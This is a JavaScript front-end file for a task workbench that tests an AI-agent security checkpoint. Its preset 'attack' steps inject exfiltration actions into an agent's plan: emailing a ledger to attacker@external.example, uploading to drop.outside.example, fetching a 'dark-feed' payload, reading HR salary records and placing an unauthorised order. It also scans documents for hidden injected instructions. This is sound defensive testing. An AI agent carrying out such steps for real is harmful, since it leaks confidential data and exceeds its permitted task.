// MANDATE "Your task" workbench (R-E4.3.1). Bring your own task and test MANDATE's real-time security.
// Uses app.js helpers ($, esc, http, act, api, stamp, why, toolH, head, term, ask, loading, empty, errBox, clock, poll).
// Every verdict shown here is read back from the real control plane and the tool server; this file decides nothing.
"use strict";
const WB = { cat: null, draft: null, run: null, previews: {} };

// The three examples come from app.js's single SCENARIOS list, so Home and this page can never disagree.
const EXAMPLES = (window.SCENARIOS || []).map(x => ({
  title: x.title, outcome: x.outcome, badgeCls: { ALLOW: "allow", APPROVAL_REQUIRED: "held", DENY: "block" }[x.outcome],
  t: x.instruction, desc: x.one_line, why: x.why, p: x.profile, k: x.task, docs: x.docs,
  steps: JSON.parse(JSON.stringify(x.steps)), expected: x.expected
}));

const MODES = {
  simulate: ["Check the plan", "Checks every step against the real rules without running anything. Nothing happens, nothing is recorded.", "info"],
  steps: ["Run it for real", "Each step goes through the real checkpoint to the tool server, and the result is recorded in the audit log.", "indigo"],
  ai: ["Let a live AI model decide", "A real language model chooses what to do. Every choice it makes still passes the checkpoint.", "allow"],
};

const draft = () => WB.draft || (WB.draft = {
  instruction: EXAMPLES[0].t,
  profile: EXAMPLES[0].p,
  task: EXAMPLES[0].k,
  mode: "simulate",
  steps: JSON.parse(JSON.stringify(EXAMPLES[0].steps)),
  accept: false,
  selectedExample: 0,
  showAdvanced: false
});

const prof = id => WB.cat.profiles.find(p => p.id === id);
const taskOf = d => (prof(d.profile) || { tasks: [] }).tasks.find(t => t.id === d.task);
const scanTag = s => !s ? "" : s.verified === false ? `<span class="tag block"><span class="d"></span>could not be checked, so it counts as untrusted</span>`
  : s.flagged ? `<span class="tag block"><span class="d"></span>hidden instructions found &middot; score ${esc(s.score)}</span>` : `<span class="tag allow"><span class="d"></span>no hidden instructions &middot; score ${esc(s.score)}</span>`;

function suggest(d) {
  const T = {
    price_check: [["search_suppliers", { item: "valves" }], ["get_prices", { item: "valves" }]],
    purchase: [["search_suppliers", { item: "valves" }], ["get_prices", { item: "valves" }], ["create_purchase_request", { supplier: "umbrella", amount: 41.5 }]],
    research: [["read_doc", { page: "valves" }], ["write_summary", { title: "valves-research", text: "Summary." }]],
    report: [["read_doc", { page: "stark_quote_poisoned.txt" }], ["write_summary", { title: "valves-report", text: "Report." }]],
  };
  return (T[d.task] || [["search_suppliers", { item: "valves" }], ["get_prices", { item: "valves" }]]).map(([tool, args]) => ({ tool, args }));
}

// ---------------------------------------------------------------- composer
VIEWS.task = async el => {
  el.innerHTML = loading("Opening the workbench…");
  try { WB.cat = await http("/console/workbench"); } catch (e) { el.innerHTML = errBox(e, "open the workbench"); return; }
  const d = draft();
  const q = new URLSearchParams(location.hash.split("?")[1] || "");   // #/task?s=1 preselects an example (Home links here)
  const pick = q.get("s");
  if (pick !== null && EXAMPLES[+pick]) {
    const x = EXAMPLES[+pick];
    Object.assign(d, { selectedExample: +pick, instruction: x.t, profile: x.p, task: x.k, steps: JSON.parse(JSON.stringify(x.steps)) });
    if (x.docs && !(WB.cat.docs || []).length) { try { const r = await act("/console/workbench/docs/samples"); WB.cat.docs = r.documents; } catch (e) { /* samples are optional */ } }
  }
  if (!prof(d.profile)) d.profile = WB.cat.profiles[0].id;
  if (!taskOf(d)) d.task = prof(d.profile).tasks[0].id;
  if (d.mode === "ai" && !WB.cat.llm.enabled) d.mode = "simulate";
  draw(el);
};

function draw(el) {
  const d = draft(), c = WB.cat, p = prof(d.profile), t = taskOf(d), llm = c.llm;
  const currentEx = EXAMPLES[d.selectedExample] || EXAMPLES[0];
  const preview = !!(S.health && S.health.preview);

  el.innerHTML = head("", "Run your own task",
    `Give an agent a job, see the plan it would carry out, then run it through the real checkpoint. Start from one of the three examples below, or open <b>Customise</b> to write your own wording, pick a different agent, or add your own document.`,
    `<span class="tag indigo"><span class="d"></span>engine ${esc(c.engine)}</span>`) + `
  ${preview ? `<div class="callout info" style="margin-bottom:16px"><b>This is a preview.</b> You can read everything here, but nothing can be run. To run it yourself, see QUICKSTART.md and start MANDATE with <span class="mono">bash demo/launch.sh</span>.</div>` : ""}
  <div class="split wb">
    <div class="stack">

      <section class="card">
        <div class="eyebrow">Step 1 &middot; Choose what to try</div>
        <p class="ink2 small" style="margin:4px 0 12px">Each one fills in the agent, its job and its planned steps for you.</p>
        <div class="preset-grid">
          ${EXAMPLES.map((x, i) => `
            <div class="preset-card ${d.selectedExample === i ? "active" : ""}" data-ex="${i}" role="button" tabindex="0" aria-pressed="${d.selectedExample === i}">
              <div class="preset-title"><b>${esc(x.title)}</b> ${stamp(x.outcome)}</div>
              <div class="preset-desc">${esc(x.desc)}</div>
            </div>`).join("")}
        </div>
      </section>

      <section class="card">
        <div class="eyebrow">Step 2 &middot; Read the plan before anything runs</div>
        <div style="margin:10px 0 14px">
          <div style="font-size:15px;line-height:1.45"><b>The agent has been told:</b> &ldquo;${esc(d.instruction)}&rdquo;</div>
          <div class="ink3 small" style="margin-top:6px"><b>What should happen:</b> ${esc(currentEx.expected)}</div>
        </div>
        <div class="row">
          <span class="eyebrow" style="margin:0">The steps it plans to take</span>
          <span class="spacer"></span>
          <span class="ink3 small" id="wb-step-count">${d.steps.length} step${d.steps.length === 1 ? "" : "s"}</span>
        </div>
        <div id="wb-steps">${stepsHtml()}</div>
      </section>

      <section class="card">
        <div class="eyebrow">Step 3 &middot; Run it</div>
        <div class="row" style="margin-top:12px;gap:10px;flex-wrap:wrap">
          <button class="primary" id="wb-go" ${preview ? "disabled" : ""} style="padding:10px 20px;font-size:14.5px">${esc(MODES[d.mode][0])}</button>
          ${d.mode !== "simulate" ? `<button class="ghost" id="wb-safe" ${preview ? "disabled" : ""}>Check the plan instead</button>`
      : `<button class="ghost" id="wb-live" ${preview ? "disabled" : ""}>Run it for real instead</button>`}
        </div>
        <p class="ink3 small" style="margin-top:10px">${esc(MODES[d.mode][1])}</p>
        <p class="err" id="wb-err" style="margin-top:8px"></p>

        <div class="wb-advanced-box">
          <button class="wb-advanced-toggle" id="wb-adv-toggle" aria-expanded="${d.showAdvanced}">
            <span>${d.showAdvanced ? "Hide Customize ⚙" : "Customize ⚙"}</span>
          </button>

          <div id="wb-adv-body" style="display:${d.showAdvanced ? 'block' : 'none'};margin-top:16px">
            <label class="f">
              <b>What to tell the agent</b>
              <small>Your own wording. This text never grants any permission by itself.</small>
              <textarea id="wb-ins" maxlength="${c.limits.instruction_chars}" placeholder="For example: compare valve quotes, but do not touch HR data." style="margin-top:6px;min-height:70px">${esc(d.instruction)}</textarea>
            </label>

            <div style="margin-top:16px">
              <b>Which agent does it</b>
              <div class="grid g2" style="margin-top:8px">
                ${c.profiles.map(x => `
                  <label class="wb-pick ${x.id === d.profile ? "on" : ""}">
                    <input type="radio" name="wb-prof" value="${esc(x.id)}" ${x.id === d.profile ? "checked" : ""}>
                    <b>${esc(x.label)}</b>
                    <span class="ink2 small">${esc(x.blurb)}</span>
                  </label>`).join("")}
              </div>
            </div>

            <div style="margin-top:16px">
              <label class="f">
                <b>Its job</b>
                <small>The job decides which tools are allowed. Anything outside it is blocked.</small>
                <select id="wb-task" style="margin-top:4px">
                  ${p.tasks.map(x => `<option value="${esc(x.id)}" ${x.id === d.task ? "selected" : ""}>${esc(x.title)}</option>`).join("")}
                </select>
                <small>${esc(t ? t.description : "")}</small>
              </label>
            </div>

            <div style="margin-top:16px">
              <b>How to run it</b>
              <div class="grid g3" style="margin-top:8px">
                ${Object.entries(MODES).map(([k, [n, sub]]) => `
                  <label class="wb-pick ${k === d.mode ? "on" : ""} ${k === "ai" && !llm.enabled ? "off" : ""}">
                    <input type="radio" name="wb-mode" value="${k}" ${k === d.mode ? "checked" : ""} ${k === "ai" && !llm.enabled ? "disabled" : ""}>
                    <b>${esc(n)}</b>
                    <span class="ink2 small">${esc(sub)}${k === "ai" && !llm.enabled ? " Needs an API key, which is not set." : ""}</span>
                  </label>`).join("")}
              </div>
            </div>

            <div style="margin-top:18px">
              <div class="row">
                <b>Documents the agent can read</b>
                <span class="spacer"></span>
                <button class="sm ghost" id="wb-samples">Reload the sample documents</button>
              </div>
              <p class="ink3 small" style="margin:4px 0 0">Every document is scanned for hidden instructions before the agent is allowed to see it.</p>
              <div id="wb-docs" style="margin-top:8px">${docsHtml()}</div>

              <label class="wb-drop" id="wb-drop" style="margin-top:10px">
                <input type="file" id="wb-file" multiple accept="${c.documents.formats.join(",")}" hidden>
                <b>Add your own document</b>
                <span class="ink3 small">Plain text only, up to ${(c.documents.max_bytes / 1000).toFixed(0)} KB. Drop it here or click to choose.</span>
              </label>
              <p class="err" id="wb-docerr"></p>
            </div>
          </div>
        </div>
      </section>
    </div>

    <aside class="stack result wb-sidebar">
      <section class="card wb-security-card">
        <div class="row" style="margin-bottom:12px;gap:8px">
          <span class="tag allow"><span class="d"></span>Active containment</span>
          <span class="spacer"></span>
          <span class="mono ink3 small">${esc(p.agent_id || "agent:cell-a")}</span>
        </div>

        <h3 style="margin:0;font-size:20px">${esc(p.label)}</h3>
        <div class="ink3 small" style="margin-top:3px">Role: <b class="ink2">${esc(p.role)}</b> &middot; Deterministic boundaries enforced at runtime</div>

        <div class="wb-spec-grid">
          <div class="wb-spec-row">
            <span class="wb-spec-k">Its job right now</span>
            <span class="wb-spec-v"><b>${esc(t ? t.title : "")}</b></span>
          </div>
          <div class="wb-spec-row">
            <span class="wb-spec-k">Where it runs</span>
            <span class="wb-spec-v">In a ${term("am11", "sandbox")} cell <span class="ink3 small">&middot; no host disk or network</span></span>
          </div>
          <div class="wb-spec-row">
            <span class="wb-spec-k">Data sensitivity</span>
            <span class="wb-spec-v">Catalogue & public records only <span class="ink3 small">&middot; HR records unreachable</span></span>
          </div>
          <div class="wb-spec-row">
            <span class="wb-spec-k">Allowed network</span>
            <span class="wb-spec-v"><span class="mono small">${p.destinations.map(esc).join(", ")}</span> <span class="tag small block" style="margin-left:6px;padding:1px 6px">Default deny</span></span>
          </div>
          <div class="wb-spec-row" style="align-items:flex-start">
            <span class="wb-spec-k" style="padding-top:3px">Allowed tools</span>
            <div class="wb-spec-v row" style="gap:5px">
              ${(t && t.tools ? t.tools : []).map(tl => `
                <span class="tag allow" style="font-size:12px;padding:2px 8px"><span class="d"></span>${esc(tl.name)}</span>
              `).join("")}
            </div>
          </div>
        </div>

        <div id="wb-hints"></div>
      </section>

      ${c.runs.length ? `
        <details class="card flat wb-recent-dropdown">
          <summary class="wb-recent-summary">
            <div class="row" style="gap:8px;width:100%;align-items:center">
              <span class="eyebrow" style="margin:0">Recent runs (${c.runs.length})</span>
              <span class="spacer"></span>
              <span class="ink3 small">View history &#9662;</span>
            </div>
          </summary>
          <div class="wb-recent-body">
            <select id="wb-run-dropdown" class="wb-run-select">
              <option value="">Jump to a recent run...</option>
              ${c.runs.slice(0, 10).map(r => `
                <option value="${esc(r.id)}">
                  ${clock(r.created)} &mdash; ${esc(r.instruction.slice(0, 42))} (${MODES[r.mode] ? MODES[r.mode][0] : r.mode})
                </option>
              `).join("")}
            </select>
            <div class="feed wb-feed" style="margin-top:10px">
              ${c.runs.slice(0, 5).map(r => `
                <div class="item wb-feed-item" onclick="location.hash='#/taskrun?id=${esc(r.id)}'" role="button" tabindex="0">
                  <div class="wb-feed-time mono">${clock(r.created)}</div>
                  <div class="wb-feed-main">
                    <div class="s">${esc(r.instruction.slice(0, 52))}</div>
                    <div class="w ink3 micro">${esc(MODES[r.mode] ? MODES[r.mode][0] : r.mode)}</div>
                  </div>
                  <div class="wb-feed-badge">${runBadge(r)}</div>
                </div>`).join("")}
            </div>
            <div style="text-align:right;margin-top:8px">
              <a class="ghost-link small" href="#/audit">Full Audit Log &rarr;</a>
            </div>
          </div>
        </details>` : ""}
    </aside>
  </div>`;

  wire(el);
}

// Plain names for the planned steps. No emoji: the outcome tag beside each step carries the meaning.
function friendlyStep(s) {
  const a = s.args || {};
  if (s.tool === "search_suppliers") return { name: "Search the supplier catalogue", detail: `looking for "${a.item || "valves"}"` };
  if (s.tool === "get_prices") return { name: "Look up supplier prices", detail: `price list for "${a.item || "valves"}"` };
  if (s.tool === "read_doc") return { name: "Read a document", detail: `opening "${a.page || "valves"}"` };
  if (s.tool === "write_summary") return { name: "Write a summary into the company wiki", detail: `saving "${a.title || "summary"}"` };
  if (s.tool === "read_hr_record") return { name: "Open a confidential HR record", detail: `the record for "${a.employee || "details"}"` };
  if (s.tool === "send_email") return { name: "Send an email out", detail: `to ${a.to || "attacker@external.example"}` };
  if (s.tool === "create_purchase_request") return { name: "Place a purchase order", detail: `with ${a.supplier || "unapproved-vendor"}, for $${a.amount || 250}` };
  if (s.tool === "list_workspace_docs") return { name: "List the documents it can see", detail: "in its own sandbox" };
  if (s.tool === "read_workspace_doc") return { name: "Read one of its own documents", detail: `opening "${a.name || "quote"}"` };
  if (s.tool === "web_search") return { name: "Fetch an external web page", detail: `${a.url || "https://dark-feed.example/payload"}` };
  if (s.tool === "upload_file") return { name: "Upload a file to external server", detail: `exfiltrating to "${a.url || "https://drop.outside.example"}"` };
  return { name: toolH(s.tool), detail: JSON.stringify(a) };
}

function stepsHtml() {
  const d = draft(), t = taskOf(d);
  if (!d.steps.length) d.steps = suggest(d);
  const allowed = new Set((t ? t.tools : []).map(x => x.name));

  return `
    <div class="wb-plan-list">
      ${d.steps.map((s, i) => {
        const info = friendlyStep(s);
        const isAllowed = allowed.has(s.tool);
        return `
          <div class="wb-plan-card ${isAllowed ? "" : "blocked-step"}">
            <span class="wb-plan-num">${i + 1}</span>
            <div class="wb-plan-body">
              <div class="wb-plan-name">${esc(info.name)}</div>
              <div class="wb-plan-detail">${esc(info.detail)}</div>
            </div>
            <div class="wb-plan-tag">
              ${isAllowed
                ? `<span class="tag allow"><span class="d"></span>inside its job</span>`
                : `<span class="tag block"><span class="d"></span>outside its job &mdash; will be blocked</span>`}
            </div>
            <button class="sm ghost" data-rm="${i}" title="Remove this step" aria-label="Remove step ${i + 1}, ${esc(info.name)}" style="margin-left:6px">Remove</button>
          </div>
        `;
      }).join("")}
    </div>
    <div class="wb-attack-picker">
      <div class="row" style="justify-content:space-between;align-items:center;margin-bottom:8px">
        <span class="ink2 small"><b>Test the Checkpoint:</b> Inject a disallowed step into the plan:</span>
        <button class="sm ghost" id="wb-reset" title="Reset steps to the original example">↺ Reset plan</button>
      </div>
      <div class="wb-attack-chips">
        <button class="atk-chip" id="wb-add-attack" title="Attempts to access confidential HR salary records">+ HR Salary Record</button>
        <button class="atk-chip" id="wb-add-email" title="Attempts to send internal data to an external email address">+ Email Outside</button>
        <button class="atk-chip" id="wb-add-upload" title="Attempts to upload sensitive local files to an untrusted external server">+ External File Upload</button>
        <button class="atk-chip" id="wb-add-order" title="Attempts to create an unauthorized purchase order exceeding policy limits">+ $9,500 Purchase Order</button>
        <button class="atk-chip" id="wb-add-web" title="Attempts to browse an untrusted external web page">+ External Web Page</button>
        <button class="atk-chip" id="wb-add-wiki" title="Attempts to overwrite internal corporate documentation out-of-role">+ Overwrite Wiki</button>
      </div>
    </div>
  `;
}

function docsHtml() {
  const docs = WB.cat.docs || [];
  if (!docs.length) return `<div class="ink3 small">No documents are loaded. Reload the samples above, or add your own.</div>`;
  return `<div class="wb-doclist">${docs.map(x => { const pv = WB.previews[x.name];
    return `<div class="wb-doc"><span class="mono">${esc(x.name)}</span><span class="ink3 small">${(x.bytes / 1000).toFixed(1)} KB</span><span class="spacer"></span>
      ${pv ? (pv.error ? `<span class="tag">${esc(pv.error)}</span>` : scanTag({ verified: pv.verified, flagged: pv.injection, score: pv.score })) : `<button class="sm ghost" data-prev="${esc(x.name)}">Scan it now</button>`}
      <button class="sm ghost" data-del="${esc(x.name)}" aria-label="Remove ${esc(x.name)}">✕</button></div>`; }).join("")}</div>`;
}

function wire(el) {
  const d = draft(), rerender = () => draw(el);

  // Step 1: the example cards, clickable and operable from the keyboard
  const choose = async b => {
    const idx = +b.dataset.ex;
    const x = EXAMPLES[idx];
    d.selectedExample = idx;
    d.instruction = x.t;
    d.profile = x.p;
    d.task = x.k;
    d.steps = JSON.parse(JSON.stringify(x.steps));
    if (x.docs && !(WB.cat.docs || []).length) {
      try { const r = await act("/console/workbench/docs/samples"); WB.cat.docs = r.documents; } catch (e) { /* samples are optional */ }
    }
    rerender();
    hints();
  };
  el.querySelectorAll("[data-ex]").forEach(b => {
    b.onclick = () => choose(b);
    b.onkeydown = e => { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); choose(b); } };
  });

  // The customise drawer
  const advToggle = $("#wb-adv-toggle");
  if (advToggle) advToggle.onclick = () => {
    d.showAdvanced = !d.showAdvanced;
    const body = $("#wb-adv-body");
    if (body) body.style.display = d.showAdvanced ? "block" : "none";
    advToggle.setAttribute("aria-expanded", String(d.showAdvanced));
    advToggle.querySelector("span").textContent = d.showAdvanced ? "Hide customise" : "Customise";
  };

  // Step 3: the two plain choices, which just set the mode and run
  const setMode = m => { d.mode = m; rerender(); };
  if ($("#wb-safe")) $("#wb-safe").onclick = () => setMode("simulate");
  if ($("#wb-live")) $("#wb-live").onclick = () => setMode("steps");

  // Custom prompt input
  const ins = $("#wb-ins");
  if (ins) ins.oninput = e => { d.instruction = e.target.value; hints(); };

  // Profile and task pickers
  el.querySelectorAll('[name="wb-prof"]').forEach(r => r.onchange = () => {
    d.profile = r.value;
    d.task = prof(d.profile).tasks[0].id;
    d.steps = suggest(d);
    rerender();
  });
  const taskSel = $("#wb-task");
  if (taskSel) taskSel.onchange = e => {
    d.task = e.target.value;
    d.steps = suggest(d);
    rerender();
  };

  // Mode picker
  el.querySelectorAll('[name="wb-mode"]').forEach(r => r.onchange = () => {
    d.mode = r.value;
    rerender();
  });

  // Step quick-actions
  const updateSteps = () => {
    const sc = $("#wb-step-count");
    if (sc) sc.textContent = `${d.steps.length} step${d.steps.length === 1 ? "" : "s"}`;
    $("#wb-steps").innerHTML = stepsHtml();
    wire(el);
  };

  el.querySelectorAll("[data-rm]").forEach(b => b.onclick = () => {
    d.steps.splice(+b.dataset.rm, 1);
    if (!d.steps.length) d.steps.push({ tool: "search_suppliers", args: { item: "valves" } });
    updateSteps();
  });

  const addAtk = $("#wb-add-attack");
  if (addAtk) addAtk.onclick = () => {
    d.steps.push({ tool: "read_hr_record", args: { employee: "executive_payroll" } });
    updateSteps();
  };

  const addEmail = $("#wb-add-email");
  if (addEmail) addEmail.onclick = () => {
    d.steps.push({ tool: "send_email", args: { to: "attacker@external.example", body: "Exfiltrated procurement ledger" } });
    updateSteps();
  };

  const addUpload = $("#wb-add-upload");
  if (addUpload) addUpload.onclick = () => {
    d.steps.push({ tool: "upload_file", args: { url: "https://drop.outside.example/vault_dump" } });
    updateSteps();
  };

  const addOrder = $("#wb-add-order");
  if (addOrder) addOrder.onclick = () => {
    d.steps.push({ tool: "create_purchase_request", args: { supplier: "unapproved-vendor", amount: 9500 } });
    updateSteps();
  };

  const addWeb = $("#wb-add-web");
  if (addWeb) addWeb.onclick = () => {
    d.steps.push({ tool: "web_search", args: { url: "https://dark-feed.example/payload" } });
    updateSteps();
  };

  const addWiki = $("#wb-add-wiki");
  if (addWiki) addWiki.onclick = () => {
    d.steps.push({ tool: "write_summary", args: { title: "unauthorized-system-override", text: "Compromised content" } });
    updateSteps();
  };

  const rs = $("#wb-reset");
  if (rs) rs.onclick = () => {
    const cur = EXAMPLES[d.selectedExample] || EXAMPLES[0];
    d.steps = JSON.parse(JSON.stringify(cur.steps));
    updateSteps();
  };

  const runDrop = $("#wb-run-dropdown");
  if (runDrop) runDrop.onchange = e => {
    if (e.target.value) location.hash = `#/taskrun?id=${encodeURIComponent(e.target.value)}`;
  };

  // Sample documents
  const samplesBtn = $("#wb-samples");
  if (samplesBtn) samplesBtn.onclick = async () => {
    try { const r = await act("/console/workbench/docs/samples"); WB.cat.docs = r.documents; rerender(); }
    catch (e) { $("#wb-docerr").textContent = e.message; }
  };

  el.querySelectorAll("[data-del]").forEach(b => b.onclick = async () => {
    try { const r = await act("/console/workbench/docs/delete", { name: b.dataset.del }); WB.cat.docs = r.documents; delete WB.previews[b.dataset.del]; rerender(); }
    catch (e) { $("#wb-docerr").textContent = e.message; }
  });

  el.querySelectorAll("[data-prev]").forEach(b => b.onclick = async () => {
    b.disabled = true; b.textContent = "Scanning…";
    try { const r = await act("/console/workbench/docs/preview", { name: b.dataset.prev }); WB.previews[b.dataset.prev] = r.available ? r : { error: "no detector" }; }
    catch (e) { WB.previews[b.dataset.prev] = { error: e.message }; }
    $("#wb-docs").innerHTML = docsHtml();
    wire(el);
  });

  const drop = $("#wb-drop"), file = $("#wb-file");
  if (drop && file) {
    drop.onclick = e => { if (e.target !== file) file.click(); };
    drop.ondragover = e => { e.preventDefault(); drop.classList.add("over"); };
    drop.ondragleave = () => drop.classList.remove("over");
    drop.ondrop = e => { e.preventDefault(); drop.classList.remove("over"); upload([...e.dataTransfer.files]); };
    file.onchange = () => upload([...file.files]);
  }

  async function upload(files) {
    const errs = [];
    for (const f of files) {
      if (f.size > WB.cat.documents.max_bytes) { errs.push(`${f.name}: larger than ${WB.cat.documents.max_bytes / 1000} KB`); continue; }
      let text; try { text = await f.text(); } catch (x) { errs.push(`${f.name}: could not be read as text`); continue; }
      try { const r = await act("/console/workbench/docs", { name: f.name, text }); WB.cat.docs = r.documents; if (r.warning) errs.push(`${f.name}: ${r.warning}`); }
      catch (x) { errs.push(`${f.name}: ${x.message}`); }
    }
    rerender();
    if (errs.length) $("#wb-docerr").textContent = errs.join(" · ");
  }

  // RUN ACTION
  $("#wb-go").onclick = async () => {
    $("#wb-err").textContent = "";
    if (!d.instruction.trim()) { $("#wb-err").textContent = "Tell the agent what to do first. Open Customise to write it."; return; }
    const body = { instruction: d.instruction, profile: d.profile, task: d.task, mode: d.mode };
    if (d.mode === "ai") body.accept_provider_disclosure = d.accept;
    else body.steps = d.steps.map(s => ({ tool: s.tool, args: s.args }));
    $("#wb-go").disabled = true;
    try {
      const r = await act("/console/workbench/run", body);
      WB.run = r;
      location.hash = `#/taskrun?id=${r.id}`;
    } catch (e) {
      $("#wb-err").textContent = /preview mode/i.test(e.message) ? "This is a preview, so nothing can be run. See QUICKSTART.md to start MANDATE for real." : `Couldn't start that: ${e.message}`;
      $("#wb-go").disabled = false;
    }
  };

  hints();
}

let hintT;
function hints() {
  clearTimeout(hintT);
  const d = draft();
  hintT = setTimeout(async () => {
    const box = $("#wb-hints");
    if (!box) return;
    try {
      const r = await act("/console/workbench/assess", { instruction: d.instruction, profile: d.profile, task: d.task });
      box.innerHTML = r.hints && r.hints.length ? `
        <div class="callout" style="margin-top:12px">
          <b>What the rules say about this plan:</b>
          <ul class="wb-list" style="margin-top:6px">${r.hints.map(h => `<li>${esc(h)}</li>`).join("")}</ul>
        </div>` : "";
    } catch (e) { box.innerHTML = ""; }
  }, 350);
}

// ---------------------------------------------------------------- run view
const runBadge = r => {
  const s = (r.summary && r.summary.by_response) || {}, sim = r.mode === "simulate";
  if (r.status === "running" || r.status === "queued") return `<span class="tag info"><span class="d"></span>running</span>`;
  if (r.status === "failed") return `<span class="tag block"><span class="d"></span>failed</span>`;
  return sim ? `<span class="tag info"><span class="d"></span>checked only</span>` : (s.DENY ? `<span class="tag block"><span class="d"></span>${s.DENY} blocked</span>` : s.APPROVAL_REQUIRED ? `<span class="tag held"><span class="d"></span>${s.APPROVAL_REQUIRED} needed approval</span>` : `<span class="tag allow"><span class="d"></span>all allowed</span>`);
};

VIEWS.taskrun = async el => {
  const id = new URLSearchParams(location.hash.split("?")[1] || "").get("id");
  if (!id) { location.hash = "#/task"; return; }
  const draw2 = async () => {
    let r;
    try { r = await http(`/console/workbench/runs/${encodeURIComponent(id)}`); }
    catch (e) { el.innerHTML = errBox(e, "load that run"); return; }
    WB.run = r;
    el.innerHTML = runHtmlWB(r);
    wireRun(el, r);
    if (r.status === "running" || r.status === "queued") setTimeout(() => { if (location.hash.includes(id)) draw2(); }, 1500);
  };
  el.innerHTML = loading("Loading the run…");
  await draw2();
};

function explainEvent(e, sim) {
  const d = e.decision || {};
  if (!e.decision) return e.ok ? "Executed cleanly (within job boundaries)." : `No decision was recorded: ${esc(e.result || "did not reach checkpoint")}`;
  return esc(why(d)) || esc(d.reason || "");
}

function runHtmlWB(r) {
  const sim = r.mode === "simulate", s = r.summary || {};
  const live = {};
  r.events.filter(e => e.kind === (sim ? "simulated" : "tool")).forEach(e => {
    const k = (e.decision || {}).response || (e.ok ? "ALLOW" : "DENY");
    live[k] = (live[k] || 0) + 1;
  });
  const by = r.summary ? (sim ? (s.simulated_by_response || {}) : (s.by_response || {})) : live;
  const effects = s.tool_server_effects || r.events.filter(e => e.kind === "tool").flatMap(e => e.effects || []);

  return head(`Your task · ${esc(MODES[r.mode] ? MODES[r.mode][0] : r.mode)}`, esc(r.instruction.length > 110 ? r.instruction.slice(0, 108) + "…" : r.instruction),
    `${esc(r.profile_label)} · task <span class="mono">${esc(r.task)}</span>${r.documents && r.documents.length ? ` · documents: ${r.documents.map(esc).join(", ")}` : ""}${r.provider ? ` · model <span class="mono">${esc(r.provider.model)}</span>` : ""}`,
    `<div class="row">${runBadge(r)}<a class="btn sm" href="#/task">← Back to Workbench</a></div>`) + `
  ${sim ? `<div class="callout info"><b>Dry Run Result.</b> Each step below shows what MANDATE's real policy engine evaluated on live security rules. Nothing was sent to external services, and no real damage was done.</div>` : ""}
  ${r.status === "failed" ? `<div class="callout block" style="margin-top:12px"><b>The run stopped.</b> ${esc(r.error || "")}</div>` : ""}
  <section class="sect"><div class="grid g4">
    <div class="card stat"><div class="l">${sim ? "Would be allowed" : "Allowed"}</div><div class="v" style="color:var(--allow)">${by.ALLOW || 0}</div></div>
    <div class="card stat"><div class="l">${sim ? "Would be held" : "Held for you"}</div><div class="v" style="color:var(--held)">${by.APPROVAL_REQUIRED || 0}</div><div class="s">${(s.pending_approvals || []).length ? `${s.pending_approvals.length} waiting below` : ""}</div></div>
    <div class="card stat"><div class="l">${sim ? "Would be blocked" : "Blocked & Isolated"}</div><div class="v" style="color:var(--block)">${by.DENY || 0}</div></div>
    <div class="card stat"><div class="l">Real Side-Effects</div><div class="v">${sim ? "0" : effects.length}</div><div class="s">${sim ? "safe dry run" : "effects recorded"}</div></div></div></section>
  <div class="split"><section class="card"><div class="eyebrow">Action Timeline & Checkpoint Decisions</div><div class="wb-tl">
    ${r.events.map(e => {
      if (e.kind === "setup") return `<div class="wb-ev sys"><b>Sandbox Initialized:</b> <span class="ink2">${esc(e.what)}</span></div>`;
      if (e.kind === "note") return `<div class="wb-ev sys"><span class="ink2">${esc(e.what)}</span></div>`;
      if (e.kind === "error") return `<div class="wb-ev sys"><span class="tag block"><span class="d"></span>error</span> <span>${esc(e.what)}</span></div>`;
      if (e.kind === "model" && !e.tool_calls.length && r.final_answer) return `<div class="wb-ev model"><span class="eyebrow">AI Model Output</span><div class="ink2 small">Task finished. The response is displayed on the right.</div></div>`;
      if (e.kind === "model") return `<div class="wb-ev model"><span class="eyebrow">AI Model · Turn ${esc(e.turn)}</span>${e.content ? `<div class="wb-think">${esc(e.content)}</div>` : ""}${e.tool_calls.length ? `<div class="ink3 small">Wants to call: ${e.tool_calls.map(c => esc(toolH(c.name))).join(", ")}</div>` : ""}</div>`;
      if (e.kind === "owner") return `<div class="wb-ev sys"><b>Manager Action:</b> ${esc(e.what)}${e.note ? ` <span class="ink3">“${esc(e.note)}”</span>` : ""}</div>`;
      const d = e.decision || {}, resp = d.response || (e.ok ? "ALLOW" : "DENY");
      const pend = (s.pending_approvals || []).find(a => a.id === d.approval_id);
      return `<div class="wb-ev">
        <div class="row"><span class="ink3 small">${e.source === "model" ? "The AI Agent" : e.source === "owner-approved" ? "Approved Retry" : sim ? "Simulated Action" : "Live Action"}</span><span class="spacer"></span>${stamp(resp)}</div>
        <div style="margin-top:6px;font-size:15px">Action: <b>${esc(toolH(e.tool))}</b>${argBrief(e.args)}</div>
        <div class="ink2" style="margin-top:4px">${explainEvent(e, sim)}</div>
        ${e.scan ? `<div style="margin-top:6px">${scanTag(e.scan)}</div>` : ""}
        ${sim ? "" : `<div class="ink3 small" style="margin-top:6px">${e.effects && e.effects.length ? `Tool server recorded: ${e.effects.map(x => esc(x.tool)).join(", ")}` : "Zero external effects allowed."}</div>`}
        ${pend ? (s.agent_status === "quarantined" ? `<div class="callout block" style="margin-top:8px">Action paused for approval, but agent is currently <b>quarantined</b>. Review in <a href="#/agents">Agents</a> before approving. <button class="sm danger" data-ap="${esc(pend.id)}" data-ok="0">Reject</button></div>`
          : `<div class="row" style="margin-top:8px"><button class="sm primary" data-ap="${esc(pend.id)}" data-ok="1">Approve Once and Run</button><button class="sm danger" data-ap="${esc(pend.id)}" data-ok="0">Reject</button></div>`) : ""}
        <details class="tech mini" style="margin-top:8px"><summary>Cryptographic Evidence</summary><div><pre>${esc(JSON.stringify({ decision: e.decision, scan: e.scan, tool_server_effects: e.effects, result_seen_by_agent: e.result }, null, 1))}</pre>
          ${d.decision_id ? `<div class="row" style="margin-top:8px"><a class="btn sm" href="#/investigate?d=${esc(d.decision_id)}">Open in Decisions</a><button class="sm" data-pack="${esc(d.decision_id)}">Export Evidence Pack</button></div>` : ""}</div></details></div>`;
    }).join("") || empty("Starting…", "")}</div></section>
  <aside class="stack">
    ${r.final_answer ? `<section class="card"><div class="eyebrow">AI Agent's Answer</div><div class="wb-think" style="margin-top:8px">${esc(r.final_answer)}</div>
      <p class="ink3 small" style="margin-top:8px">This is what the LLM produced. What was actually permitted is proven in the timeline on the left.</p></section>` : ""}
    ${!sim && r.summary ? `<section class="card"><div class="eyebrow">Security Summary</div><dl class="kv">
      <dt>Agent Status</dt><dd>${statusTag(s.agent_status || "active")}</dd>
